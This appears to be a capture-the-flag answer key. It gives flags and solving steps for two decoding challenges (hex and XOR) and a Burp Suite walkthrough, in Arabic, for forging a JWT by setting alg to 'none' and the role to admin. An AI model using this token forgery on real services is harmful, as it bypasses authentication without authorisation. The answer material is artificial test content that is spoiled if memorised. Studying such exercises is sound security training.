CHALLENGE 01 — "three parts, one word"  [50 pts / Easy]
  Category : Encoding / Crypto
  Answer   : GHOST
  Method   :
    The page source has four hex fragments as HTML comments:
      p1="5453"  p2="4F"  p3="48"  p4="47"
    Join them: 5453 4F 48 47
    Read each two hex digits as ASCII:
      54=T  53=S  4F=O  48=H  47=G
    Reverse the string: G H O S T  →  GHOST
  Hints    :
    Hint 1 (-10 pts): each operation's output feeds the next.
    Hint 2 (-15 pts): one operation is reversible by reading backwards.


CHALLENGE 02 — "noisy bits"  [75 pts / Easy]
  Category : XOR Cipher
  Answer   : CIPHER
  Method   :
    The clue gives an array of hex bytes and a key (_0x0A_ = 10):
      0x49 0x43 0x5A 0x42 0x4F 0x58
    XOR each with 10 (0x0A):
      0x49^0x0A = 0x43 = C
      0x43^0x0A = 0x49 = I
      0x5A^0x0A = 0x50 = P
      0x42^0x0A = 0x48 = H
      0x4F^0x0A = 0x45 = E
      0x58^0x0A = 0x52 = R
    Result: CIPHER
  Hints    :
    Hint 1 (-15 pts): something was applied to each byte.
    Hint 2 (-20 pts): XOR is self-inverse — knowing the key lets you undo it.

CHALLENGE 05 — "access denied"  →  Burp + JWT Editor
─────────────────────────────────────────────────────
الهدف: تزوّر JWT token عشان تبقى "admin".

خطوات:
STEP 1 — جيب الـ token الأصلي:
  1. Repeater → Request:
       POST /api/c5/token HTTP/1.1
       Host: <host>
       x-session: <token>
       Content-Type: application/json

       {}
  2. Send → في الـ Response هتلاقي Set-Cookie:
       ctf_auth=eyJ...
  3. انسخ قيمة الـ JWT.

STEP 2 — فك تشفير الـ JWT يدوياً:
  الـ JWT عبارة عن 3 أجزاء مفصولة بنقطة (.):
    HEADER.PAYLOAD.SIGNATURE
  كل جزء مشفر بـ Base64URL.

  افتح Burp → Decoder:
  1. الصق الجزء الأول (قبل أول نقطة).
  2. Decode as → Base64.
  3. هتلاقي: {"alg":"HS256","typ":"JWT"}

  كرر نفس الكلام للجزء الثاني:
  هتلاقي: {"role":"viewer","uid":42,"iat":...}

STEP 3 — عدّل وأعد التشفير:
  غيّر الـ header:
    {"alg":"none","typ":"JWT"}
  غيّر الـ payload:
    {"role":"admin","uid":42,"iat":...}

  في Decoder:
  1. اكتب الـ header الجديد → Encode as Base64.
  2. اكتب الـ payload الجديد → Encode as Base64.
  3. شيل علامات الـ = من آخرهم.
  4. كوّن الـ token الجديد:
       <header_b64>.<payload_b64>.
     (لاحظ: من غير signature — بس نقطة في الآخر)

STEP 4 — بعت الـ token المزوّر:
  Repeater → Request:
    POST /api/c5/verify HTTP/1.1
    Host: <host>
    x-session: <token>
    Content-Type: application/json
    Cookie: ctf_auth=<الـ token الجديد>

    {}
  Send → لو الـ response فيه "correct":true → 🎯

TIP: في Burp Pro في extension اسمه "JWT Editor"
     بيعمل كل ده أوتوماتيك.
